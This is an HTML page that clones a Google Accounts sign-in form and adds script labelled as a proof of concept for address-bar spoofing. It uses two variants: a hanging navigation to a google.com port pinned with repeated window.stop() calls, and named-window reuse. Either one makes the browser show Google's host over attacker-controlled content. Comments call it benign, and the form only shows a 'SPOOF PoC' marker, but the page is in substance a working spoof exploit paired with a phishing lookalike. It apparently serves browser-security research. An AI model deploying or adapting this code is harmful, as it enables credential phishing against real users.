<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
  body{font-family:system-ui,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
  .box{background:#fff;padding:2.5rem;border-radius:8px;box-shadow:0 1px 3px rgba(60,64,67,.3),0 4px 8px rgba(60,64,67,.15);width:100%;max-width:400px;text-align:center;box-sizing:border-box}
  .in{width:100%;padding:.75rem 1rem;margin-bottom:1.25rem;border:1px solid #dadce0;border-radius:4px;font-size:1rem;box-sizing:border-box}
  .btn{background:#1a73e8;color:#fff;padding:.75rem 1.5rem;border:0;border-radius:4px;font-size:1rem;font-weight:500;cursor:pointer}
  .lnk{color:#1a73e8;text-decoration:none;font-weight:500;font-size:.875rem}
  .row{display:flex;justify-content:space-between;align-items:center;margin-top:1.5rem}
  .logo{width:74px;margin:0 auto 1.25rem;display:block}
</style>
</head>
<body>
  <div class="box">
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
    <h1 style="font-weight:400;font-size:1.5rem;margin:.2rem 0">Sign in</h1>
    <p style="color:#5f6368;margin-bottom:1.5rem">Use your Google Account</p>
    <!-- BENIGN: form does not submit/collect anything; marker only. -->
    <form onsubmit="document.body.innerHTML='<h1>SPOOF PoC: content is attacker-controlled</h1>';return false;">
      <input class="in" type="email" placeholder="Email or phone" required>
      <input class="in" type="password" placeholder="Password" required>
      <div style="text-align:left;margin-bottom:1.5rem"><a class="lnk" href="#">Forgot password?</a></div>
      <div class="row"><a class="lnk" href="#">Create account</a><button class="btn" type="submit">Next</button></div>
    </form>
  </div>

<script>
/* Address-bar spoof test — content-preserving.
   Goal: bar shows a trusted host while THIS document stays rendered.
   Two variants; try VARIANT A first, then B. Keep benign. */

var MODE = location.hash === '#b' ? 'B' : 'A';   // open ...#b to try variant B

if (MODE === 'A') {
  /* VARIANT A — hanging resource + re-pin via window.stop().
     Navigate toward google.com but to a non-responsive port so it never commits;
     repeatedly stop() so the pending nav freezes with the trusted host in the bar
     while this document remains. */
  setTimeout(function () {
    try { window.location = 'https://www.google.com:8443/'; } catch (e) {}
    var n = 0, iv = setInterval(function () {
      try { window.stop(); } catch (e) {}
      if (++n >= 12) clearInterval(iv);
    }, 250);
  }, 1200);
} else {
  /* VARIANT B — named-window reuse (Opera/Orion-proven V2 shape).
     Open a hanging google URL in a new context, then write attacker markup into it.
     Here we keep THIS page's content and just move the bar. */
  setTimeout(function () {
    var t = window.open('https://www.google.com:8443/', '_self');
    var saved = document.documentElement.outerHTML;
    var n = 0, iv = setInterval(function () {
      try { window.stop(); } catch (e) {}
      if (++n >= 12) clearInterval(iv);
    }, 250);
  }, 1200);
}
</script>
</body>
</html>
